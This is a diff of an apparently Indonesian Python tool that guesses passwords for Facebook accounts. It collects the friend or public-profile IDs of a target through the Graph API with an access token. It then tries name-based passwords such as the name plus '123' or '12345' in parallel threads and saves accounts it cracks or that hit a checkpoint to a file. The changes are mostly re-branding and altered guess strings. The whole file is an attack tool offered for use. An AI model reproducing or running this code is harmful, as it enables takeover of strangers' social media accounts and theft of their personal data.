@@ -82,7 +82,7 @@ class gas:
             try:ttl=r['birthday']
             except:ttl=''
             open('cp','a').write(user+'|'+pw+'|'+ttl+'\n')
-            print(f'\r\x1b[1;33m[CP] {user}|{pw}|{ttl}\x1b[0m\n',end='')
+            print(f'\r\x1b[1;33m[CP] {user}|{pw},{ttl}\x1b[0m\n',end='')
         print(f'\rCRACK:-{str(cot)}/{len(id)} OK/CP:-{str(ok)}/{str(cp)}',end='')
     def get1(self):
         r=json.loads(req.get(f'https://graph.facebook.com/me/friends?access_token={self.token}').text)
@@ -108,17 +108,17 @@ class gas:
                 print('\nStarting Crack...\n--------------------------------\n')
                 for email in id:
                     uid,name=email.split('|')
-                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345','bismillah']
+                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345','name']
                     elif(len(str(name.lower()))<=2):
-                        memek=[name.lower()+'12345','bismillah']
+                        memek=[name.lower()+'12345','name']
                     elif(len(str(name.lower()))<=3):
-                        memek=[name.lower()+'123',name.lower()+'12345','bismillah']
+                        memek=[name.lower()+'123',name.lower()+'12345','name']
                     else:
-                        memek=[name.lower()+'123',name.lower()+'12345','bismillah']
+                        memek=[name.lower()+'123',name.lower()+'12345','name']
                     try:
                         for pw in memek:kirim.submit(self.crack,uid,pw)
                     except:pass
-        print('\n### [CRACK FINISHED] ###')
+        print('\n### [UDAH SELESAI KAK] ###')
     def get2(self):
         print('\n\t[ Crack ID Teman Atau Publik ]\n')
         target=input('Masukan ID Target: ')
@@ -151,17 +151,17 @@ class gas:
                 print('\nStarting Crack...\n--------------------------------\n')
                 for email in id:
                     uid,name=email.split('|')
-                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345','bismillah']
-                    elif(len(str(name.lower()))<=2):                               memek=[name.lower()+'12345','bismillah']
+                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345','name']
+                    elif(len(str(name.lower()))<=2):                               memek=[name.lower()+'12345','name']
                     elif(len(str(name.lower()))<=3):
-                        memek=[name.lower()+'123',name.lower()+'12345','bismillah']
+                        memek=[name.lower()+'123',name.lower()+'12345','name']
                     else:
-                        memek=[name.lower()+'12345','bismillah']
+                        memek=[name.lower()+'12345','name']
                     try:
                         for pw in memek:
                             kirim.submit(gas(self.token).crack,uid,pw)
                     except:pass
-        print('\n### [CRACK FINISHED] ###')
+        print('\n### [UDAH SELESAI KAK] ###')
     def ua(self):
         print('\n\t[ Useragent Setting ]\n\n# Useragent Saat Ini:',open('ua','r').read(),'\n')
         a=input('[?] Ganti useragent y/t: ')
@@ -178,7 +178,7 @@ class gas:
         name=json.loads(req.get(f'https://graph.facebook.com/me?access_token={self.token}').text)['name']
         os.system('clear')
         cowsay.cow(f'Hallo: {name} :)\nYour IP: {ip}')
-        print('\n\t[ CODED BY: MUHAMMAD LATIF HARKAT ]\n\t\tSapi Crack Version: 1.0 (BETA)\n\nPilih Metode Crack!\n\n1. Crack Daftar Teman Anda\n2. Crack Daftar Teman Orang\n3. Setting Useragent\n4. Hapus Token (logout)\n')
+        print('\n\t[ CODED BY: MUHAMMAD LATIF HARKAT ]\n\t\tRECODE : Gilangsluur Crack Version: 1.0 (BETA)\n\nPilih Metode Crack!\n\n1. Crack Daftar Teman Anda\n2. Crack Daftar Teman Orang\n3. Setting Useragent\n4. Hapus Token (logout)\n5.by1 kak')
         p=input('[+] Chosee: ')
         if(p in ('01','1')):self.get1()
         elif(p in ('02','2')):self.get2()
